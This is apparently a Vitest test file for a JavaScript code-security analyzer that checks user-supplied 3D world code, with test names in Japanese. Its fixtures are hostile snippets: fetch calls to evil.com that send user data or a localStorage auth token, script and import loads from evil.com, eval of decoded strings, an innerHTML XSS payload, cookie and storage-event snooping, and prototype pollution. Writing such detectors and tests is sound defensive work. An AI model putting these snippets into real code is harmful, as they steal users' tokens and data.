import { describe, it, expect } from 'vitest'
import { analyzeCodeSecurity } from '../src/analyzer.js'

describe('CodeSecurityService - analyzer', () => {
  describe('正常系', () => {
    it('正常なコードはviolationなし', () => {
      const code = `
        import { useFrame } from '@react-three/fiber'
        import { RigidBody } from '@react-three/rapier'

        export function createWorld() {
          const mesh = { position: [0, 0, 0] }
          return mesh
        }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasEval).toBe(false)
      expect(signals.hasDynamicCodeExecution).toBe(false)
      expect(signals.hasNetworkAPI).toBe(false)
      expect(signals.hasNavigatorAccess).toBe(false)
      expect(signals.hasStorageAccess).toBe(false)
      expect(signals.hasObfuscatedCode).toBe(false)
      expect(signals.detectedViolations).toHaveLength(0)
    })
  })

  describe('異常系 - eval検出', () => {
    it('eval()の使用を検出', () => {
      const code = `
        const code = "alert('XSS')"
        eval(code)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasEval).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-eval',
            severity: 'critical',
            message: 'eval()の使用は禁止されています',
          }),
        ])
      )
    })
  })

  describe('異常系 - setTimeout/setInterval 文字列引数検出', () => {
    it('setTimeout に文字列を渡すことを検出', () => {
      const code = `
        setTimeout("alert('XSS')", 1000)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasDynamicCodeExecution).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-string-timeout',
            severity: 'critical',
          }),
        ])
      )
    })
  })

  describe('異常系 - ネットワークAPI検出', () => {
    it('fetch()の使用を検出', () => {
      const code = `
        fetch('https://evil.com/steal', {
          method: 'POST',
          body: JSON.stringify(userData)
        })
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasNetworkAPI).toBe(true)
      expect(signals.hasNetworkWithoutPermission).toBe(true)
      expect(signals.referencedDomains).toContain('evil.com')
    })

    it('権限付きfetch()は許可', () => {
      const code = `
        fetch('https://cdn.jsdelivr.net/data.json')
      `

      const signals = analyzeCodeSecurity(code, {
        network: {
          allowedDomains: ['cdn.jsdelivr.net']
        }
      })

      expect(signals.hasNetworkAPI).toBe(true)
      expect(signals.hasNetworkWithoutPermission).toBe(false)
    })
  })

  describe('異常系 - ストレージアクセス検出', () => {
    it('localStorageアクセスを検出', () => {
      const code = `
        const token = localStorage.getItem('auth_token')
        fetch('https://evil.com/steal?token=' + token)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasStorageAccess).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-storage-access',
            severity: 'critical',
          }),
        ])
      )
    })

    it('cookieアクセスを検出', () => {
      const code = `
        const cookies = document.cookie
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasStorageAccess).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-cookie-access',
            severity: 'critical',
          }),
        ])
      )
    })

    it("addEventListener('storage', ...)を検出", () => {
      const code = `
        window.addEventListener('storage', (e) => {
          if (e.key === 'xrift-refresh-token') {
            // トークンを傍受
          }
        })
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasStorageAccess).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-storage-event',
            severity: 'critical',
          }),
        ])
      )
    })

    it('onstorageへの代入を検出', () => {
      const code = `
        window.onstorage = function(e) {
          console.log(e.key, e.newValue)
        }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasStorageAccess).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-storage-event',
            severity: 'critical',
          }),
        ])
      )
    })
  })

  describe('異常系 - navigator検出', () => {
    it('navigator.userAgentアクセスを検出', () => {
      const code = `
        const fingerprint = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
        }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasNavigatorAccess).toBe(true)
      expect(signals.detectedViolations.length).toBeGreaterThan(0)
    })
  })

  describe('異常系 - DOM操作検出', () => {
    it('innerHTML書き込みを検出', () => {
      const code = `
        const userInput = "<img src=x onerror=alert('XSS')>"
        document.body.innerHTML = userInput
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasDangerousDOMManipulation).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-dangerous-dom',
            severity: 'critical',
          }),
        ])
      )
    })

    it('document.createElement("script")を検出', () => {
      const code = `
        const script = document.createElement('script')
        script.src = 'https://evil.com/malicious.js'
        document.body.appendChild(script)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasDangerousDOMManipulation).toBe(true)
    })
  })

  describe('異常系 - 難読化検出', () => {
    it('atob()使用を検出', () => {
      const code = `
        const decoded = atob('ZXZpbCBjb2Rl')
        eval(decoded)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasObfuscatedCode).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-obfuscation',
            severity: 'critical',
          }),
        ])
      )
    })

    it('String.fromCharCode()使用を検出', () => {
      const code = `
        const str = String.fromCharCode(101, 118, 97, 108)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasObfuscatedCode).toBe(true)
    })
  })

  describe('異常系 - グローバル変数改ざん', () => {
    it('window.fetchの上書きを検出', () => {
      const code = `
        const originalFetch = window.fetch
        window.fetch = function(...args) {
          console.log('Intercepted:', args)
          return originalFetch(...args)
        }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-global-override',
            severity: 'critical',
          }),
        ])
      )
    })

    it('Object.prototypeの汚染を検出', () => {
      const code = `
        Object.prototype.isAdmin = true
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-prototype-pollution',
            severity: 'critical',
          }),
        ])
      )
    })
  })

  describe('インポート解析', () => {
    it('許可パッケージのインポートを記録', () => {
      const code = `
        import React from 'react'
        import { Canvas } from '@react-three/fiber'
        import * as THREE from 'three'
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.importedPackages).toEqual(['react', '@react-three/fiber', 'three'])
      expect(signals.detectedViolations).toHaveLength(0)
    })

    it('外部URLインポートを検出', () => {
      const code = `
        import malicious from 'https://evil.com/hack.js'
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-external-import',
            severity: 'critical',
          }),
        ])
      )
    })
  })
})
